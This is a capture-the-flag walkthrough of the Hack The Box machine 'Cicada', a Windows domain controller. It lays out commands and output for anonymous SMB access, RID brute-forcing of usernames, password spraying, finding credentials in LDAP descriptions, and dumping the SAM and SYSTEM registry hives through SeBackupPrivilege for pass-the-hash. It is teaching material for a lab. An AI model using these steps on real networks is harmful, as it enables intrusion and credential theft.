Cicada is a Windows machine rated as easy. It's a good box for a beginner to practice AD enumeration.



# Initial Enumeration


We start off with a port scan so we know what we have to work with.  
As we're not worried about detection we can use Rustscan and increase the speed of Nmap.

```bash
TARGET=10.10.11.35

rustscan --addresses $TARGET -- -sC -sV -T4 -oA portscan
```

Rustscan returns quite a few open ports, and as we already know that it's a Windows host,
we can see that it's likely an AD DC because we can recognize the standard ports of DNS (53), Kerberos (88),
RPC (135), SMB (139 & 445), LDAP (389,636,3268,3269) as well as WinRM (5985).

When we get the results from nmap we can see that this is indeed the case, with the domain being `cicada.htb`,
and that the hostname is `CICADA-DC.cicada.htb`, which we can add to `/etc/hosts`.

SMB is a good place to start, so we begin with checking if we can get a [Null/Guest](https://preview.sensepost.com/blog/2024/guest-vs-null-session-on-windows/) session.
  
First off, we'll list the shares.
```bash
smbclient -L $TARGET

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

There are two interesting shares, `DEV` and `HR`.

We're unable to read the `DEV` share, but when connecting to the `HR` using anonymous auth,
we find a file we can download and read.

```bash
smbclient -U '' --password '' //$TARGET/HR 
Try "help" to get a list of possible commands.

```

Now we have a default password! 

# Getting a foothold  

We could also achieve the same thing using guest authentication, and now this comes into play.
Although we have a default password, we need find a user that hasn't changed password. 

Usernames can be enumerated using NetExec smb --rid-brute, which on this box can be done using a guest session, but not a null session.

```bash
nxc smb $TARGET -u '' -p '' --rid-brute   
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\: 
SMB         10.10.11.35     445    CICADA-DC        [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


nxc smb $TARGET -u 'Guest' -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest:

SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)

<snip>

SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

To get a list of users we can save the output to a temporary file and clean it up using awk and grep:  
`cat tmp.txt | grep -i euser | awk '{print $6}' |  awk -F\\ '{print $2}' > users.txt`

Now that we have a list of users we can do a password spray attack with the default password.

```bash
PASS='<redacted>'

nxc smb $TARGET -u users3.txt -p $PASS --continue-on-success
```

We find that the domain user `michael.wrightson` still has the default password, which gives us a valid set of credentials to work with.
When checking SMB, however, we find that we can't access any other shares. 
 
We're unable use the credentials to connect using WinRM, but perhaps we can authenticate with LDAP. 
 
```bash
nxc ldap cicada.htb -u $USER -p $PASS           
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:<redacted>
```

Success! We can now enumerate domain objects.

To get all the objects we can run the following command:
```bash
ldapsearch -H ldap://$TARGET -b "dc=cicada,dc=htb" -D $USER@cicada.htb -w $PASS "(objectClass=*)" > ldap.txt

```
This gives quite a lot of output though (5911 lines of text), but it doesn't hurt to have it saved if we might need it later.
We can also do a search for users by using `objectClass=person` and save to a file for only the user objects.

Now that we have pulled some domain info we can see if there's anything stored in the user descriptions using grep:
```bash
cat ldap.txt | grep -i desc
```

In one of the descriptions we can read `Just in case I forget my password is <redacted>`.

We could do another password spray to get the username, but why poke at the target more than necessary?
Even though being discovered isn't a factor, the information is already saved, so we can just grep for the phrase using the flag `-A` to display lines below the match.

```bash
grep 'my passw' -A 23 ldap.txt
```

Now we can see that the user is `david.orelious`. 
 
Yet again we go back to SMB and NetExec, and we find that our new user can access the `DEV` share.  
Inside the share we find a script called Backup_script.ps1, which contains yet another set of credentials.

Using our third set of credentials we can finally connect to the host using WinRM.
```bash
evil-winrm -i $TARGET -u $USER -p $PASS
```

Now we can collect the user flag.

# Privilege Escalation
A good place to start is to check the users privileges. 

```shell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Here we see that the user has `SetBackupPrivilege` set, which means that the user can read all
files, and thus we can dump registry hives to get NTLM hashes for cracking or pass-the-hash attacks.

```shell
mkdir C:\temp
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
download C:\temp\sam
download C:\temp\system
```

After removing the files from the server and disconnecting, we can now use pypykatz to extract hashes:

```bash
pypykatz registry --sam sam system
```

With the Administrators hash to connect using WinRM and collect the root flag from the admin desktop.
